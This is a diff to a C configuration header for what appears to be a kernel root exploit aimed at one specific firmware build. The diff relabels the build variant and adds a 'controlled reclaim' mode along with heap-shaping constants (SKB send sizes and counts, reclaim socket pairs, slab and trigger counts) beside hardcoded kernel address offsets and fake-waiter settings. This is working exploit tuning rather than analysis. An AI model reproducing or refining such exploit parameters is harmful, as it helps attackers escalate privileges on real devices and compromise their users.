@@ -7,7 +7,8 @@
  * Firmware-dependent addresses and layouts in this file were derived from
  * the exact FZA1 Image/ELF/BTF and BL.
  * The app selects the repository's existing tracefs, physical-P0, MCAST,
- * configfs, and pipe route without target-specific timing or reclaim tuning.
+ * configfs, and pipe route.  The shared controlled mm_struct reclaim path
+ * keeps the target page behind the SKB head-allocation shaping step.
  */
 
 /*
@@ -26,10 +27,11 @@
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL \
-  "b5q-F731NTBS5FZA1-clean-tracefs-mcast-configfs-pipe-root"
+  "b5q-F731NTBS5FZA1-controlled-tracefs-mcast-configfs-pipe-root"
 #define APP_PHYS_P0_ORACLE 1
 #define APP_TRACEFS_SLIDE 1
 #define APP_CLOSED_FOPS_ROUTE 1
+#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
 #define APP_FOPS_BEFORE_PIPE 1
 #define APP_EXACT_PIPE_BUFFER_ONLY 1
 #define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
@@ -47,6 +49,23 @@
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0xa8080000ULL
+
+/* Shared controlled-reclaim and SKB head-shaping contract. */
+#define SKB_DATA_DELTA (-0xe80LL)
+#define SKB_SEND_SIZE 0x8e80
+#define SKB_RECLAIM_SENDS 64
+#define APP_SLIDE_RECLAIM_SENDS 64
+#define PIPE_MAX_ATTEMPTS 12
+
+/* The S918_ prefix is retained by the repository's shared implementation. */
+#define S918_PAGE_SCAN_MAX 256
+#define S918_KSNITCH_HINT_COLLISIONS 2
+#define S918_KSNITCH_FULL_COLLISIONS 5
+#define S918_DMA32_SKIP_SLABS 8
+#define S918_TRIGGER_SLABS 24
+#define S918_SKB_SENDS 256
+#define S918_SKB_SNDBUF 8388608
+#define S918_RECLAIM_SOCKET_PAIRS 32
 
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
